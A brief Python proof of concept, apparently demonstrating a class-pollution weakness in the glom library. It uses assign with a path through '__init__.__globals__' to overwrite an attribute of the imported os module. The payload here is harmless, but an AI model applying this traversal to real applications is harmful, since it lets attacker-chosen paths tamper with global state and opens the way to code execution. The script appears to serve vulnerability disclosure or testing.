from glom import assign
import subprocess
import random

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj = Animal('cat', 11)

assign(obj, '__init__.__globals__.subprocess.os.__name__', 'polluted')